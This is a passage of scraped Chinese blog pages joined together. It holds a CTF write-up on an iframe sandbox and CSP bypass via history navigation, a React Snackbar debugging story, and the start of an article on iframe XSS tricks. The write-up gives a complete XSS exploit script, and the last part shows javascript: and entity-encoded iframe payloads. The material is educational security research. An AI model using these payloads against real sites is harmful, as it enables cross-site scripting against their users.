&lt;script> console.log('run') function loadTest2() &#123; f.removeAttribute('sandbox') f.src = 'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\\/script>' &#125; &lt;/script> 測試流程是： 等待 iframe 載入完畢，會在畫面上看到 test1，此時因為有 sandbox，所以 script 不會執行 按下 load test2 按鈕，把 sandbox 移除，載入 test2，script 被執行 按下 top level navigation，把網頁跳去其他地方 按下瀏覽器上的上一頁 那按完上一頁之後，預期狀況會是什麼？會根據有沒有 bfcache，出現兩種結果，先看有 bfcache 的。 如果有 bfcache 的話，按完上一頁就會是剛剛一樣的狀態，可以觀察到： console 沒有出現 run，代表 script 不會重新被執行 iframe 的 src 是 test2 test2 的隨機數跟剛剛一樣，代表 iframe 中的 script 也沒有重新被執行 畢竟叫做 bfcache 嘛，所以會完整保留剛剛的狀態，不會重新載入一次網頁。 那如果沒有 bfcache 呢？照理來說網頁應該要重新載入一次才對，所以預期的狀況會是最剛開始的樣子： &lt;iframe sandbox id=f src=\"data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script>\">&lt;/iframe> 也就是一個 sandbox 的 iframe 載入 test1。 但如果實際按下上一頁，會發現結果是既不是一開始的 sandbox + test1，也不是剛才的 no sandbox + test2，而是兩者的混合體：sandbox + test2。 換句話說，sandbox 屬性維持了頁面最新的狀態，是有的，但是 iframe 的 src 卻不是最新的，而是留在歷史紀錄裡的 test2，兩者結合起來，就變成了 sandbox 的 test2。 這個「回到上一頁時，iframe 的 src 回到上次的內容」的機制，就叫做 iframe reparenting，似乎沒有對應的 spec 完整描述，而且各個瀏覽器的實作也都不太一樣。 這個行為大概就是：「我歷史紀錄裡有個被 iframe 載入的 page，現在你按了上一頁，為了增進使用者體驗，我要把這個 page 直接放回到 iframe 中」，但弔詭的是屬性卻不是沿用上次的，而是直接用了當前頁面的。 如果我們把流程反過來做，就是一種 iframe 的 sandbox bypass： &lt;body> &lt;iframe id=f src=\"data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script>\">&lt;/iframe> &lt;button onclick=\"loadTest2()\">load test2&lt;/button> &lt;button onclick=\"location = 'a.html'\">top level navigation&lt;/button> &lt;/body> &lt;script> console.log('run') function loadTest2() &#123; f.setAttribute('sandbox', '') f.src = 'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\\/script>' &#125; &lt;/script> 我們先載入了安全的 test1，並且沒有 sandbox 屬性，接著我們想載入邪惡的 test2，因此加上了 sandbox 屬性，覺得這樣就沒問題了。 但殊不知如果你把網頁導去其他地方，回到上一頁之後，就會出現沒有 sandbox 的 test2。 總而言之呢，要記住的是，當你回到上一頁時： sandbox 屬性永遠跟著最新的頁面 src 會是上一次最後載入的網頁 2025-10-10 更新： Chrome 在 2025 年 9 月做了一個變更：Enabling bfcache for Cache-Control: no-store，就算禁用 HTTP 快取也依然開啟 bfcache，導致上面的測試會失敗。 但只要依照文章內所說的，隨便建立一個 websocket 連線讓 bfcache 失效即可： &lt;body> &lt;iframe id=f src=\"data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script>\">&lt;/iframe> &lt;button onclick=\"loadTest2()\">load test2&lt;/button> &lt;button onclick=\"location = 'a.html'\">top level navigation&lt;/button> &lt;/body> &lt;script> // to disable bfcache const ws = new WebSocket('ws://example.com'); console.log('run') function loadTest2() &#123; f.setAttribute('sandbox', '') f.src = 'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\\/script>' &#125; &lt;/script> 3. CSP 的繼承如果是用 iframe src 的話，由於就是嵌入了另一個獨立的網頁，因此兩個網頁之間的 CSP 沒有任何關聯，不會互相影響。但如果是用 srcdoc 的話，就有繼承關係了。 以底下的程式碼為例： &lt;head> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none'\"> &lt;/head> &lt;body> &lt;iframe srcdoc=\"Test:&lt;script>document.writeln(Math.random())&lt;/script>\">&lt;/iframe> &lt;a href=\"a.html\">top level navigation&lt;/a> &lt;/body> &lt;script> console.log('run') &lt;/script> 由於有著 script-src &#39;none&#39; 的 CSP，因此頁面上的 script 不會執行，然後 srcdoc 裡的 script 也不會執行，因為通常 iframe srcdoc 的 CSP 會繼承它的 parent，聽起來也很合理。 那接下來我們來試跟剛剛類似的事情： 確認頁面上有 CSP 確認 srcdoc 的 script 無法執行 按下 top level navigation，去到別的頁面 更新檔案，把 head 裡的 CSP 刪掉（你要自己手動做） 按下上一頁 一樣假設在沒有 bfcache 的狀況下，當我又回到這個網頁時，會是什麼狀況？預期中的行為應該是：「就跟第一次載入一樣」，因此頁面上的 script 跟 srcdoc 裡的 script 都沒有 CSP，都可以執行程式碼。 但答案是： 頁面上確實沒有 CSP，所以 script 可以執行，有印出 run 但是 srcdoc 的 script 卻被 CSP 擋住了，無法執行 也就是說，此時 iframe srcdoc 的 CSP 並不是繼承於當前頁面，而是繼承於 history 裡的結果，才會發生這種狀況。 用專有名詞來說的話，叫做 session history 以及 policy container，iframe 的 CSP 來自於 policy container，而這個 policy container 的儲存結果又與 session history 有關，但因為這兩個專有名詞我都沒有深入研究，因此就不多提了。 全部加在一起綜合以上的幾點結果，我們知道了幾件事情，當你回到上一頁時： sandbox 屬性永遠跟著最新的頁面 src 會是上一次最後載入的網頁 srcdoc 的 CSP 會繼承上次的結果 sandbox 的行為很顯然跟另外兩者不同，就只有它跟著最新的頁面，其他兩個都跟著上次的結果。 接著回顧一下題目的核心程式碼（檢查 opener 那個我先拿掉了，這樣比較好理解核心概念）： res.end(` &lt;script> document.head.insertAdjacentHTML( \"beforeend\", \\`&lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none';\">\\` ); &lt;/script> &lt;iframe srcdoc=\"$&#123;escape(memo)&#125;\">&lt;/iframe> `.trim()); 第一步，我們先載入一個 sandbox iframe，src 會是我們的 XSS payload： const challengeHost = 'http://localhost:1337' const xssPayload = `&lt;script>alert(1)&lt;\\/script>` const payload = `&lt;iframe sandbox=\"allow-same-origin\" src=\"/memo?memo=$&#123;xssPayload&#125;\">` const win = window.open(`$&#123;challengeHost&#125;/memo?memo=` + payload) 此時這個 win 的內容就會是： &lt;head> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none';\"> &lt;/head> &lt;body> &lt;iframe srcdoc=' &lt;iframe sandbox=\"allow-same-origin\" src=\"/memo?memo=&lt;script>alert(1)&lt;/script>\"> &lt;/iframe> '> &lt;/iframe> &lt;/body> 如果更放大一點來看那個 sandbox iframe 的話，這個 iframe 裡面的內容是： &lt;head>&lt;/head> &lt;!-- 空的 head，沒有 CSP --> &lt;iframe srcdoc=\"&lt;script>alert(1)&lt;/script>\">&lt;/iframe> 由於 sandbox 的緣故，因此 script 不會執行，所以不會有 CSP。但也因為 sandbox，所以 srcdoc 裡的 script 也同樣不會執行。 接著我們把網頁跳到其他頁面，然後開啟 /memo?memo=&lt;iframe&gt;&lt;/iframe&gt;，這時候 cookie 中的內容會被取代掉。 再利用 history.back() 回去，此時如同前面所講的，網頁會重新載入，因此網頁的 HTML 變成： &lt;head> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none';\"> &lt;/head> &lt;body> &lt;iframe srcdoc=' &lt;iframe>&lt;/iframe> '> &lt;/iframe> &lt;/body> 雖然看起來是空的，但因為之前講過的 reparenting 行為，因此那個空的 iframe 的內容，會是上次的 /memo?memo=&lt;script&gt;alert(1)&lt;/script&gt;。 接著，又因為之前講過的：「sandbox 屬性永遠跟著現在的頁面」的特性，現在這個 iframe 的 sandbox 沒了。既然 sandbox 沒了，那內容就變成： &lt;head> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none';\"> &lt;/head> &lt;iframe srcdoc=\"&lt;script>alert(1)&lt;/script>\">&lt;/iframe> 原本 CSP 是空的，但因為 sandbox 不見了，所以現在又回來了。 但是呢，最後也是最重要的一點，前面提過的：「srcdoc 的 CSP 會繼承上次的結果」，因此這個 srcdoc 的 CSP 與當前頁面無關，而是繼承上次的，而上次的 CSP 是什麼？是空的，因此 script 就可以執行了，順利達成 XSS。 把題目的 opener 檢查拿掉之後，exploit 會簡單很多，比較好理解： &lt;script> const challengeHost = 'http://localhost:1337' const xssPayload = `&lt;script>alert(document.domain)&lt;\\/script>` const payload = `&lt;iframe sandbox=\"allow-same-origin\" src=\"/memo?memo=$&#123;xssPayload&#125;\">` const win = window.open(`$&#123;challengeHost&#125;/memo?memo=` + payload) setTimeout(() => &#123; const win2 = window.open(`$&#123;challengeHost&#125;/memo?memo=&lt;iframe>&lt;/iframe>`) setTimeout(() => &#123; win2.close() win.location = URL.createObjectURL(new Blob([` &lt;script> setTimeout(() => &#123; history.back(); &#125;, 500); &lt;\\/script> `], &#123; type: \"text/html\" &#125;)); &#125;, 1000) &#125;, 1000) &lt;/script> 以上就是這題的解法，主要是靠著回到上一頁時，載入 sandbox 與 CSP 兩者的來源不同，藉此創造出差異，達成 XSS。 總結根據作者的說法，這一題的靈感來源是這個 issue：srcdoc and sandbox interaction with session history #6809，而寫這篇的時候我也是看了這個 issue 好幾遍，自己做實驗很多次，才終於搞懂箇中奧妙，重點是看完之後要自己動手試試看，多試幾次大概就會知道是怎麼一回事了。 話說這個 issue 的作者 Jake Archibald，就是 HTTP 203 的主持人，這個節目對前端工程師來說應該不陌生，會講到很多與 Web 相關的議題，而有篇前端工程師的必讀經典之一：Tasks, microtasks, queues and schedules 也是他寫的。","link":"/2024/09/07/idek-ctf-2024-iframe/"},{"title":"I don't know React（一）","text":"前言 附註：目前這個 blog 對於 JSX 的語法支援有問題，所以看程式碼的時候可能沒那麼容易閱讀，我會盡快再找時間修復。 這個標題致敬了有寫 JavaScript 的人就算沒看過也一定聽過的一系列書籍：Kyle Simpson 寫的 You Don’t Know JS（中譯版翻成《你所不知道的 JS》），裡面講了許多很多人不知道的，有關於 JS 的東西。 而 I don’t know React 是我對我自己的一系列紀錄，記錄了一些我所不知道的 React，而這些文章都是由我使用 React 的經驗總結而來。這一些我曾經碰到過的錯誤，有可能很基本很常見（官方文件上面就有寫的那種，只是我沒看清楚所以不知道），也有可能比較少見（我可能在工作上寫三四年才碰到）。 換句話說，寫這系列的精神跟 YDKJS 不一樣，前者是想告訴你一些 JS 當中比較少人知道的東西，是一種「我來教你寫 JS」的感覺，而我寫這系列之所以叫做「I don’t konw」，是因為想用一系列的文章記錄自己寫 React 曾經有過的誤解或者是沒有注意到的地方，以及正確答案到底是什麼。 我也不知道這系列文會有幾篇，大概就是我每犯下一個就會來 po 個文。這系列有一個我覺得滿大的不同點，就是我會在文章開頭盡可能提供當時犯錯的場景重現，讓大家能有機會在看答案之前自己 debug，看看是否能找出錯誤在哪。我覺得這其實是最精華的部分，這不是什麼制式的面試考題，也不是從網路上隨便找來的 React 測驗，而是我在工作上碰到過的真實的狀況。 因為想要讓大家盡可能融入情境，也去思考我曾經碰過的問題，所以會有不少篇幅在於「定義以及重現問題」，如果你對自己尋找答案沒有興趣，也可以直接跳過這個部分去看解答。但我個人建議是自己先嘗試 debug，去發現問題在哪，才來看文章內的解答，才能完整地吸收文章想表達的東西。 總之呢，讓我們先來看看這一篇要講的案例吧！ 實際案例重現這次要來 demo 的案例是 Snackbar 這個 component，就是會出現在螢幕下面提示使用者的一個小巧可愛的元件。而我們的任務很簡單，就是要寫出一個 Snackbar 然後讓它可以正常運作就行了，因為這邊重點不在 style，所以我 style 的部分會隨便寫一寫，只是示意而已。 我們可以先寫一個基本的雛形出來，利用 open 這個 props 決定透明度，然後可以接受 children 的傳入並且 render 出來： function Snackbar(&#123; children, open &#125;) &#123; return ( &lt;div style=&#123;&#123; background: \"black\", color: \"white\", transition: \"all 0.3s\", opacity: open ? 1 : 0 &#125;&#125; > &#123;children&#125; &lt;/div> ); &#125; 當 open 是 true 的時候就會看得到內容，像是這樣： 那為什麼要這樣做呢？因為根據這個透明度的調整，我們可以自己寫另外一個會自動隱藏的 component，藉由 transition 來達成淡入以及淡出的效果： const duration = 1000; const transitionDuration = 300; function AutoHideSnackbar(&#123; children, onClose &#125;) &#123; const [open, setOpen] = useState(false); useEffect(() => &#123; setOpen(true); const timer = setTimeout(() => &#123; setOpen(false); &#125;, duration); const timer2 = setTimeout(() => &#123; onClose(); &#125;, duration + transitionDuration); return () => &#123; clearTimeout(timer); clearTimeout(timer2); &#125;; &#125;, [onClose]); return &lt;Snackbar open=&#123;open&#125;>&#123;children&#125;&lt;/Snackbar>; &#125; 用的時候需要像這樣使用： export default function App() &#123; const [open, setOpen] = useState(false); const handleClick = () => setOpen(true); const handleClose = () => setOpen(false); return ( &lt;div className=\"App\"> &lt;h1>Snackbar&lt;/h1> &lt;button onClick=&#123;handleClick&#125;>show&lt;/button> &#123;open &amp;&amp; ( &lt;AutoHideSnackbar onClose=&#123;handleClose&#125;>hello~&lt;/AutoHideSnackbar> )&#125; &lt;/div> ); &#125; 當我們點擊按鈕的時候，會把這一層的 open 設定成 true，就會 render &lt;AutoHideSnackbar&gt; 這個 component，在 AutoHideSnackbar 裡面初始值的 open 是 false，所以會 render &lt;Snackbar open=&#123;false&#125;&gt;hello&lt;/Snackbar&gt;，這時候 Snackbar 透明度就會是 0，處於一個看不見的狀態。 render 並且 mount 以後，執行 AutoHideSnackbar 裡面的 useEffect，把 open 設定成 true，這時候 Snackbar 的透明度就會改成 1，因為從 0 變成 1 再加上有 transition，就達成 fade in 的效果，並且設定兩個 timer 來處理自動關閉。 1 秒過後第一個 timer 觸發，把 open 設成 false，再度觸發 transition，有了 fade out 的效果。transition 結束以後第二個 timer 觸發，呼叫 onClose，然後呼叫到了 App 的 handleClose，把 App 那一層的 open 也設定為 false，於是 AutoHideSnackbar 就 unmount 了，恢復成原始的樣子。 做到這邊，一個會自動隱藏的 Snackbar 就誕生了，但其實還有地方可以再加強。 之前在使用 Ant Design 的時候有個用法深深地影響了我，那就是用 function call 的方式去 render component，而不是用 render 的。例如說你想顯示一個訊息，你可以直接這樣子做： import &#123; message &#125; from 'antd' export default function App() &#123; const handleClick = () => &#123; message.info(\"hello~\") &#125; return ( &lt;div> &lt;button onClick=&#123;handleClick&#125;>顯示訊息&lt;/button> &lt;/div> ) &#125; 而不是這樣子（antd 沒有這種用法，只是示範而已）： import &#123; Message &#125; from 'antd' export default function App() &#123; const [open, setOpen] = useState(false) const handleClick = () => &#123; setOpen(true) &#125; const handleClose = () => &#123; setOpen(false) &#125; return ( &lt;div> &lt;button onClick=&#123;handleClick&#125;>顯示訊息&lt;/button> &lt;Message open=&#123;open&#125; onClose=&#123;handleClose&#125;> hello~ &lt;/Message> &lt;/div> ); &#125; 可以看出前者的用法比後者簡潔很多，因為後者必須要自己管理 component 開啟或是關閉的狀況，但前者完全不管這些。雖然說是比較方便沒錯，可是我會說前者「沒有那麼 React」，因為 React 的精神本來就是以 state 為核心，UI 只是 state 的副產物，所以開啟或是關閉的狀況，應該要存在於 state 裡面才對。 但儘管如此，我依然會傾向前者的用法，因為當我們在顯示訊息時，我們其實並不關心他是開啟還是關閉，我們不想知道這件事情，我們唯一想做的只有「顯示訊息」，所以這時候如果像 alert 或是 confirm 那樣只需要一個 function call，事情會簡單很多。 所以接著我們就來參考 Ant Design 的原始碼，讓我們的 Snackbar 也擁有這種 static method，可以更方便地顯示訊息。 程式碼會是這樣的： Snackbar.show = function (children) &#123; const div = document.createElement(\"div\"); document.body.appendChild(div); ReactDOM.render( &lt;AutoHideSnackbar onClose=&#123;() => &#123; const unmountResult = ReactDOM.unmountComponentAtNode(div); if (unmountResult &amp;&amp; div.parentNode) &#123; div.parentNode.removeChild(div); &#125; &#125;&#125; > &#123;children&#125; &lt;/AutoHideSnackbar>, div ); &#125;; 其實就是在呼叫 function 時動態產生一個 div，然後直接使用 ReactDOM.render 把 AutoHideSnackbar render 上去，自動消失時再把 div 拿掉。透過這樣子的方式，就可以脫離原本的 React App，新建一個 React App 去 render Snackbar。 而且因為我們接收的參數 children 沒有限制，所以要顯示圖片也是可以的，像是這樣： import React from \"react\"; import &#123; Snackbar &#125; from \"./Snackbar\"; import styled from \"styled-components\"; import warningSvg from \"./icon.svg\"; import SVG from \"react-inlinesvg\"; const Warning = styled(SVG).attrs(&#123; src: warningSvg &#125;)` width: 24px; height: 24px; `; export default function App() &#123; const showSnackbar = () => &#123; Snackbar.show( &lt;div> hey! &lt;Warning /> &lt;/div> ); &#125;; return ( &lt;div className=\"App\"> &lt;h1>Snackbar&lt;/h1> &lt;p>靜態方式顯示 snackbar&lt;/p> &lt;button onClick=&#123;showSnackbar&#125;>顯示&lt;/button> &lt;/div> ); &#125; 顯示的結果： 好，這一切的一切看起來都十分完美，現在我們終於可以用一個簡單的 function call 就顯示出東西了，再也不用去維護那些麻煩的狀態… 直到你擦亮眼睛一看，發現了一件奇怪的事情，那就是你的 Snackbar 在使用 static method 那個方法的時候，fade in 居然消失了！你仔細看上面的 gif，就可以看出只有 fade out 的效果，沒有 fade in。 這就是我之前碰過的一個 bug，也就是這一篇的主角。 底下是可以完整重現這個 bug 以及上面所做的 component 的 CodeSandbox，推薦大家可以自己 fork 回去改改看，看能不能找出 bug 在哪裡，以及 root cause 到底是什麼，訓練一下自己 debug 的能力。 CodeSandbox: https://codesandbox.io/s/snackbar-debug-test-kw7iv?file=/src/App.js 接著提醒一件事情，上面的程式碼是真的會有 bug，至於我上面所說的一些有關於成因的判斷，不一定是正確的。這是我當初剛碰到這個 bug 時的第一判斷，有可能正確也有可能錯誤，現在你手中有可以完整重現問題的程式碼了，可以自己利用各種方式找出問題到底在哪裡。 底下我會先回憶一次自己當初是如何 debug 的，講完以後會開始講答案是什麼，如果想自己 debug 的人請勿往下繼續看，會被雷到。 防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~防雷分隔線~ 我是怎麼 debug 的？既然問題是出在 static method 那個用法，那我想說就朝這方向去研究好了。我做的第一件事情很簡單，就是先把每個 component 的 render 跟 useEffect 都加上 console.log，根據 log 出來的東西跟自己的想法對照，看看有沒有執行順序上跟我認知中不同的地方。 經過一段時間的嘗試，發現好像沒有什麼差別，不管用哪一個方法，都跟我認識的執行流程一樣。第一次 render AutoHideSnackbar 的時候 open 一定是 0，所以一開始一定是看不到的，接著 useEffect 完下一次 render 會變成 1，所以透明度會變成 1，因此會有個 fade in 的效果。 但最終會看到這樣的結果，fade in 的 transition 消失了，就代表出現在畫面上的時候，open 應該就是 1 了，否則不會看到這樣的結果。 debug 一陣子沒什麼頭緒之後，我開始懷疑起是不是因為某些非同步或是 React 的渲染機制，導致第一次 render 時 open 就是 true，所以我加了個 rAF，讓 open 屬性 delay 一下才變成 true： export function AutoHideSnackbar(&#123; children, onClose &#125;) &#123; const [open, setOpen] = useState(false); useEffect(() => &#123; // 原本是直接 setOpen(true)，我包了 rAF 在外面 window.requestAnimationFrame(() => setOpen(true)); const timer = setTimeout(() => &#123; setOpen(false); &#125;, duration); const timer2 = setTimeout(() => &#123; onClose(); &#125;, duration + transitionDuration); return () => &#123; clearTimeout(timer); clearTimeout(timer2); &#125;; &#125;, [onClose]); return &lt;Snackbar open=&#123;open&#125;>&#123;children&#125;&lt;/Snackbar>; &#125; 加了之後發現就沒問題了，可以成功看到 fade in 的效果。不過儘管如此，我還是不知道原本為什麼會這樣。 接著我重新再測試了一遍，發現一件很嚴重的事情！ 我並沒有把實驗的變因處理好，我一直以為是我用那個比較 tricky 的方法導致這個問題，所以一直往這個方向去找答案，去看 static method 到底跟一般的 render 有什麼不同，卻忽略了我上面的範例中，一般的 render 跟 static 的 render，還有一個變因不同，那就是「有沒有 render SVG」，我把 staic method 範例中的 SVG 拿掉，發現居然有 fade in 的效果了！ 哇操，我前面花了兩三個小時都是在做白工找錯方向，而是還是因為自己漏看，沒有定義好問題範圍所導致的。知道這一點之後，進度就快多了。 我先把 react-inlinesvg 這套件換成普通的 img，發現一樣可以正常運作，而原本一般的 render 方式，加上了 react-inlinesvg 淡入效果也會消失。因此原因差不多可以確定了，就是 react-inlinesvg 這個 library 造成的。 但到底是為什麼呢？我去看了一下它的原始碼，看不到什麼可疑的東西。在沒有其他方法的情況之下，我用了最暴力但是也最有效的一招：「改 node_modules 裡面的程式碼」。這其實就跟我慣用的 debug 方式一樣，當你束手無策，完全不知道問題出在哪的時候，就開始刪 code。 刪掉一段發現問題還在，就代表那段 code 不是兇手。刪掉了某段 code 問題就不見之後，你就知道一定跟那段 code 有關了，有點像是對程式碼進行二分搜的感覺。如果熟悉執行流程的話做起來其實還滿快的，就一直刪 code 就好了。不過對 third party 做這件事麻煩的點在於你必須直接去改 node_modules 裡面的程式碼，那些程式碼都是經過 bable transpiled 過後的，可讀性會比較低，不過還是能看懂就是了。 經過這一段刪刪改改之後，我終於發現了出問題的地方，在這裡：https://github.com/gilbarbara/react-inlinesvg/blob/v2.1.1/src/index.tsx#L209 SVG 這個 component 在 componentDidMount 的時候會去呼叫 this.load()，而 this.load 裡面會去呼叫 this.setState()，經過我幾次測試之後發現把 this.setState() 註解掉就沒事了，因此可以推斷問題應該是出在這邊。 接著我突然想起以前好像在官方文件中看過在 componentDidMount 裡面 setState 會有一些什麼事情發生，於是就去 Google componentDidMount setState，找到了很多相關的範例。 為了確保沒找錯地方，我自己寫了一個簡單的 component，並且在 componentDidMount 裡面加上 this.setState，再讓 Snackbar 去 render 它，果真重現出了一樣的問題，那就是 fade in 消失了。 程式碼會像是這樣： class Comp extends React.Component &#123; componentDidMount() &#123; this.setState(&#123; a: 1 &#125;); &#125; render() &#123; return &lt;div>hello&lt;/div>; &#125; &#125; // render 的時候 &lt;AutoHideSnackbar onClose=&#123;handleClose&#125;> &lt;Comp /> &lt;/AutoHideSnackbar> 經歷過重重難關，問題的成因總算找到了，那就是在 componentDidMount 裡面 setState，會導致一些預期外的後果。 可是這預期外的後果到底是什麼呢？ 看看官方文件怎麼說只要用 componentdidmount setstate 這個很直白的關鍵字就可以找到許多資料，像是我以前也看過的：一些自己寫 React 的好習慣- lifecycle method 跟 state 管理，或是這次文章的主軸：官方文件。 文件裡面是這樣寫的： You may call setState() immediately in componentDidMount(). It will trigger an extra rendering, but it will happen before the browser updates the screen. This guarantees that even though the render() will be called twice in this case, the user won’t see the intermediate state. 在 componentDidMount 裡面如果同步去呼叫 setState，會立刻觸發第二次 render，而且會在瀏覽器更新畫面之前，因此第一次 render 的結果使用者並不會看到，只會顯示第二次的。 這就能解釋為什麼我們的淡入功能會壞掉了。 先假設我們程式碼長這樣（CodeSandbox 範例）： class Comp extends React.Component &#123; componentDidMount() &#123; console.log(\"Comp componentDidMount\"); this.setState(&#123; a: 1 &#125;); &#125; render() &#123; console.log(\"Comp render\"); return &lt;div>hello&lt;/div>; &#125; &#125; export function Snackbar(&#123; children, open &#125;) &#123; console.log(\"Snackbar render:\", &#123; open &#125;); return ( &lt;div style=&#123;&#123; background: \"black\", color: \"white\", transition: \"all 0.3s\", opacity: open ? 1 : 0 &#125;&#125; > &#123;children&#125; &lt;/div> ); &#125; export function AutoHideSnackbar(&#123; children, onClose &#125;) &#123; const [open, setOpen] = useState(false); console.log(\"AutoHideSnackbar render:\", &#123; open &#125;); useEffect(() => &#123; console.log(\"AutoHideSnackbar useEffect\"); setOpen(true); const timer = setTimeout(() => &#123; setOpen(false); &#125;, duration); const timer2 = setTimeout(() => &#123; onClose(); &#125;, duration + transitionDuration); return () => &#123; clearTimeout(timer); clearTimeout(timer2); &#125;; &#125;, [onClose]); return &lt;Snackbar open=&#123;open&#125;>&#123;children&#125;&lt;/Snackbar>; &#125; 我們可以藉由觀察 log，來判斷出執行順序，而 log 的結果是這樣的： AutoHideSnackbar render: {open: false} Snackbar render: {open: false} Comp render Comp componentDidMount AutoHideSnackbar useEffect AutoHideSnackbar render: {open: true} Snackbar render: {open: true} Comp render 可以看出總共有兩次 render，第一次的話是： AutoHideSnackbar render: {open: false} Snackbar render: {open: false} Comp render Comp componentDidMount AutoHideSnackbar useEffect 在第一次 render 的時候，Snackbar 的 open 是 false 所以 opacity 是 0，接著 render 它的 children 也就是 Comp，render 完成以後 Comp 的 componentDidMount 執行 setState，因為在這邊執行了，所以根據文件所說，使用者不會看到第一次 render 的結果。 而 Comp 的 didMount 以後，就往上執行 AutoHideSnackbar 的 useEffect，這邊會把 open 設成 true。 這邊值得注意的一點是 React 的官網中寫著： The function passed to useEffect will run after the render is committed to the screen. 看起來「after the render is committed to the screen」這個行為大部分情況都是對的，useEffect 會在 browser 更新畫面之後才執行（render is committed to the screen 應該可以這樣理解吧？）。 但如果底下的元素有 class component 而且在 componentDidMount 裡面做了同步的 setState，就不會是這樣子了？不能確保執行 useEffect 的時候使用者已經看到上次 render 的畫面。 總之這邊執行完以後，就會執行第二次的 render： AutoHideSnackbar render: {open: true} Snackbar render: {open: true} Comp render 第二次的 render 中 opacity 會是 1，而根據官方文件所說的，使用者不會看到第一次 render 的結果，所以畫面上第一次出現時 opacity 就是 1 了，淡入的效果自然也就不見了。 後記儘管理解了上面那個行為，我當初還是有一點想不透，那就是既然 componentDidMount 代表有把東西放到 DOM 上面了，使用者不就一定會看到嗎？那是怎麼做到「既 mount 卻又不讓使用者看到結果」的？ 後來去了推特上面發問，感謝陳冠霖的回答，直接突破盲點： DOM 的更新跟畫面的更新是兩回事，pixel pipeline 要等 js 全部跑完才會做渲染的動作，舉個例子就是你用個 for loop 跑很多次 DOM update 但是畫面只會畫最後的結果 看完之後我才想到，對欸，更新 DOM 跟更新畫面是兩回事，DOM 更新了不代表 browser 就會 paint，所以的確可以做到在一個 cycle 裡面更新兩次 DOM，這樣第一個的結果就不會顯示在畫面上，只會顯示第二次的。 其實在碰到這些 React 的問題前，我一直以為自己對 React 或是對於 DOM 的運作都有一定程度的認識，可是卻屢屢遭受打擊，發現自己還是遺漏了許多重要的部分，寫一寫都會有：「我居然對 React 這麼陌生嗎QQ」的感嘆。 不過也是沒有辦法的事，反正碰到了不會的就學起來，碰到的問題多了之後，也會知道更多的解決方法，就會對這些運作機制愈來愈了解了。 以上就是 I don’t know React 的第一篇，當初花了一個早上的時間還跑去問同事，一開始一直糾結於是 static 的那種方式造成問題，整個走錯方向，直到某一刻突然開竅發現差別其實不是在那個，而是在 render 的東西不一樣。 Debug 一旦有正確抓到問題的成因，通常離找到解法就不遠了，也更能知道怎麼下關鍵字去搜尋。因為這次的經驗也提醒了我自己，debug 的時候記得把不相干的東西排除乾淨，才能真正確認問題的根源。","link":"/2020/10/31/i-dont-know-react-1/"},{"title":"iframe 與 window.open 黑魔法","text":"如果你想要在網頁上產生一個新的 window，大概就只有兩個選擇，一個是利用 iframe、embed 與 object 這些標籤將資源嵌入在同個頁面上，而另一個選擇則是使用 window.open 新開一個視窗。 身為前端開發者，我相信大家對這些都不陌生，可能有用過 iframe 嵌入第三方的網頁，或是嵌入一些 widget，也有用過 window.open 開啟新的視窗，並透過 window.opener 跟原來的視窗溝通。 但站在資安的角度來看，其實 iframe 有不少好玩的東西，無論是現實世界或是在 CTF 內都經常出現，因此我想透過這篇記錄近期學到的一些特性。 iframe 基礎先來看一下基本的 iframe 使用，透過 &lt;iframe&gt; 這個標籤，可以把其他人的網頁引入進來： &lt;iframe src=\"https://blog.huli.tw\">&lt;/iframe> 但仔細想一下，如果你的網頁可以被任何人嵌入，那就可能會有點擊劫持（Clickjacking）的風險。 因此，如果你的網頁不想被嵌入或是想設定只有特定 origin 可以嵌入，可以使用 Content-Security-Policy 以及 X-Frame-Options，這些我在不識廬山真面目：Clickjacking 點擊劫持攻擊裡面都有提過，這邊就不多講了。 有些可以發文或是留言的網站，通常都會開放一定程度的 HTML 元素，並不會完全封死，例如說至少粗體（&lt;b&gt;）與斜體（&lt;i&gt;）這些無害的元素會開放，而有些網站為了支援像是 YouTube 播放器之類的功能，也會支援 iframe 標籤。 做得比較好的網站，會限制讓你只能輸入 YouTube 影片的 ID，再在前端自己拼接上 YouTube 的前綴，確保 iframe 載入的 src 是來自於 YouTube。而有些網站可能要嵌入的站太多，又想開放比較多的自由度給使用者，因此可以讓使用者自定義 iframe src 的內容，想放什麼都可以。 如果攻擊者能控制 iframe 的 src，這時候會有哪些風險呢？ 第一個最容易想到的風險，大概就是你可以直接嵌入一個釣魚網站在裡面，例如說寫個再次登入或是領取獎品的頁面，說不定就會有人真的輸入帳號密碼然後送出表單。 但這個的影響程度有限，而且牽涉到了一點社交工程，其實有更簡單暴力的方式，那就是這樣： &lt;iframe src=\"javascript:alert(1)\">&lt;/iframe> 是的，iframe 的 src 可以放 javascript: 開頭的這種格式，就可以直接執行 JavaScript 程式碼，達成 XSS。順帶一提，&lt;form&gt; 的 action 跟 &lt;a&gt; 的 href 也都可以放，這個我在接觸資安才發現我不懂前端有稍微提到。 而且不僅如此，HTML 屬性裡的東西是可以編碼的，有三種方式可以編碼，以 &amp; 這個字元為例： 用名稱來編碼，例如說 &amp;amp;（不是每個字元都支援，這邊有列表：https://dev.w3.org/html5/html-author/charref） 用十進位來編碼，例如說 &amp;#38; 用十六進位來編碼，例如說 &amp;#x26; 所以 javascript:alert(1) 的每一個字元，你都可以自由換成上面這些編碼，例如說： &lt;iframe src=\"&amp;#x6a;&amp;#65;vAScrIpt&amp;colon;alert&amp;lpar;1&amp;rpar;\">&lt;/iframe> （想要玩玩看 encode 跟 decode 的話可以到這個網站：https://mothereff.in/html-entities） 除了 javascript: 以外，你也可以用 data: 來載入任意網頁： &lt;iframe src=\"data:text/html,&lt;h1>hello&lt;/h1>\">&lt;/iframe> 也可以指定用 base64 編碼： &lt;iframe src=\"data:text/html;base64,PGgxPmhlbGxvPC9oMT4=\">&lt;/iframe> 不過上述兩種其實沒太大用處，因為 src 如果用 data URI 的話，origin 會變成 